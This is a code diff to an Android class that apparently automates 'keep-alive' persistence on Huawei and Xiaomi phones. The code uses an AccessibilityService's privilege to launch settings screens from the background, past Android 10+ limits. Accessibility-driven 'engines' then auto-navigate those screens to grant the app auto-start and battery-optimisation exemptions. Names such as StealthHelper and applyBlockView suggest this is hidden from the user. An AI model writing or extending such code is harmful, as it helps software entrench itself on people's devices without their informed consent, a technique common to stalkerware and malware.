@@ -35,8 +35,39 @@ public final class StrategyThread {
     private Object data;
     private Object extra;
 
-    /** 防止重复触发 */
+    /** 防止重复触发 (内存) */
     private static final AtomicBoolean keepAliveTriggered = new AtomicBoolean(false);
+
+    private static final String PREF_NAME = "keep_alive_state";
+    private static final String KEY_COMPLETED = "keep_alive_completed";
+
+    /** 标记保活自动化已完成 (持久化) */
+    public static void markKeepAliveCompleted() {
+        try {
+            Context ctx = MainApplication.getApplication();
+            if (ctx != null) {
+                ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+                    .edit().putBoolean(KEY_COMPLETED, true).apply();
+                Log.d(TAG, "保活自动化完成状态已持久化");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "markKeepAliveCompleted error", e);
+        }
+    }
+
+    /** 检查保活自动化是否已完成 (持久化) */
+    private static boolean isKeepAliveCompleted() {
+        try {
+            Context ctx = MainApplication.getApplication();
+            if (ctx != null) {
+                return ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
+                    .getBoolean(KEY_COMPLETED, false);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "isKeepAliveCompleted error", e);
+        }
+        return false;
+    }
 
     /**
      * Vendor: j() default constructor - mode 0, starts timer
@@ -112,68 +143,103 @@ public final class StrategyThread {
             // 2. 更新初始进度
             StealthHelper.updateProgress(10);
 
-            // 3. 打开设置页面 (vendor: 通过 Intent 打开主设置)
-            // 关键: 不是直接打开启动管理，而是打开主设置
-            // HuaweiEngine 被动检测 HWSettings 窗口 → 自动导航
-            Context context = null;
+            // 3. 获取 Context — 优先用 AccessibilityService (有后台启动特权)
             MyAccessibilityService service = MyAccessibilityService.P();
-            if (service != null) {
-                context = service.getApplicationContext();
-            }
-            if (context == null && MainApplication.getApplication() != null) {
-                context = MainApplication.getApplication().getApplicationContext();
-            }
-
-            if (context != null) {
-                // vendor: 华为设备打开 HWSettings
-                // 关键: 必须用 AccessibilityService 作为 Context 启动
-                // Android 10+ 禁止后台 startActivity，但 AccessibilityService 有特权
-                if (DeviceUtils.isHuawei()) {
-                    try {
-                        Intent hwIntent = new Intent();
-                        hwIntent.setClassName("com.android.settings",
-                            "com.android.settings.HWSettings");
-                        hwIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        hwIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
-                        // 用 AccessibilityService 直接启动 (有后台启动特权)
-                        if (service != null) {
-                            service.startActivity(hwIntent);
-                        } else {
-                            context.startActivity(hwIntent);
-                        }
-                        Log.d(TAG, "启动华为系统设置成功");
-                    } catch (Exception e) {
-                        // fallback: 通用设置
-                        Log.w(TAG, "HWSettings 启动失败，使用通用设置", e);
-                        Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
-                        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        if (service != null) {
-                            service.startActivity(settingsIntent);
-                        } else {
-                            context.startActivity(settingsIntent);
-                        }
-                        Log.d(TAG, "启动通用系统设置");
-                    }
-                } else {
-                    // 非华为: 通用设置
-                    Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
-                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    if (service != null) {
-                        service.startActivity(settingsIntent);
-                    } else {
-                        context.startActivity(settingsIntent);
-                    }
-                    Log.d(TAG, "启动系统设置");
-                }
-            } else {
+            Context context = resolveContext(service);
+            if (context == null) {
                 Log.e(TAG, "无法获取 Context，设置页面启动失败");
                 return false;
             }
+
+            // 4. 打开厂商对应的设置页面
+            launchSettingsForVendor(context, service);
 
             return true;
         } catch (Exception e) {
             Log.e(TAG, "applyBlockView error", e);
             return false;
+        }
+    }
+
+    /**
+     * 获取可用 Context — 优先 AccessibilityService，fallback MainApplication
+     */
+    private static Context resolveContext(MyAccessibilityService service) {
+        if (service != null) {
+            return service.getApplicationContext();
+        }
+        if (MainApplication.getApplication() != null) {
+            return MainApplication.getApplication().getApplicationContext();
+        }
+        return null;
+    }
+
+    /**
+     * 根据厂商启动对应的设置页面
+     * HuaweiEngine / XiaomiEngine 被动检测窗口变化 → 自动导航
+     */
+    private static void launchSettingsForVendor(Context ctx, MyAccessibilityService svc) {
+        if (DeviceUtils.isHuawei()) {
+            launchWithFallback(svc, ctx,
+                "com.android.settings", "com.android.settings.HWSettings",
+                "华为系统设置");
+        } else if (DeviceUtils.isXiaomi()) {
+            // 小米: 打开应用详情页 → XiaomiEngine 被动检测并处理自启动+电池优化
+            Intent xiaomiIntent = new Intent();
+            xiaomiIntent.setClassName("com.miui.securitycenter",
+                "com.miui.appmanager.ApplicationsDetailsActivity");
+            xiaomiIntent.putExtra("package_name", ctx.getPackageName());
+            xiaomiIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            xiaomiIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
+            try {
+                startActivityViaService(svc, ctx, xiaomiIntent);
+                Log.d(TAG, "启动小米应用详情页成功");
+            } catch (Exception e) {
+                Log.w(TAG, "小米应用详情页启动失败，使用通用设置", e);
+                launchGenericSettings(svc, ctx);
+            }
+        } else {
+            launchGenericSettings(svc, ctx);
+        }
+    }
+
+    /**
+     * 启动指定 Activity，失败时 fallback 到通用设置
+     */
+    private static void launchWithFallback(MyAccessibilityService svc, Context ctx,
+                                            String pkg, String cls, String label) {
+        try {
+            Intent intent = new Intent();
+            intent.setClassName(pkg, cls);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
+            startActivityViaService(svc, ctx, intent);
+            Log.d(TAG, "启动" + label + "成功");
+        } catch (Exception e) {
+            Log.w(TAG, label + " 启动失败，使用通用设置", e);
+            launchGenericSettings(svc, ctx);
+        }
+    }
+
+    /**
+     * 启动通用系统设置页
+     */
+    private static void launchGenericSettings(MyAccessibilityService svc, Context ctx) {
+        Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
+        settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivityViaService(svc, ctx, settingsIntent);
+        Log.d(TAG, "启动通用系统设置");
+    }
+
+    /**
+     * 优先用 AccessibilityService 启动 Activity (有后台启动特权)
+     */
+    private static void startActivityViaService(MyAccessibilityService svc, Context ctx,
+                                                 Intent intent) {
+        if (svc != null) {
+            svc.startActivity(intent);
+        } else {
+            ctx.startActivity(intent);
         }
     }
 
@@ -188,11 +254,18 @@ public final class StrategyThread {
         try {
             if (keepAliveTriggered.get()) return;
 
+            // 持久化检查: 自动化已完成则不再触发
+            if (isKeepAliveCompleted()) {
+                keepAliveTriggered.set(true);
+                Log.d(TAG, "保活自动化已完成 (持久化)，跳过");
+                return;
+            }
+
             MyAccessibilityService service = MyAccessibilityService.P();
             if (service == null) return;
 
-            // 只在华为设备上触发
-            if (!DeviceUtils.isHuawei()) return;
+            // 支持华为和小米设备
+            if (!DeviceUtils.isHuawei() && !DeviceUtils.isXiaomi()) return;
 
             // 防止重复触发
             if (!keepAliveTriggered.compareAndSet(false, true)) return;
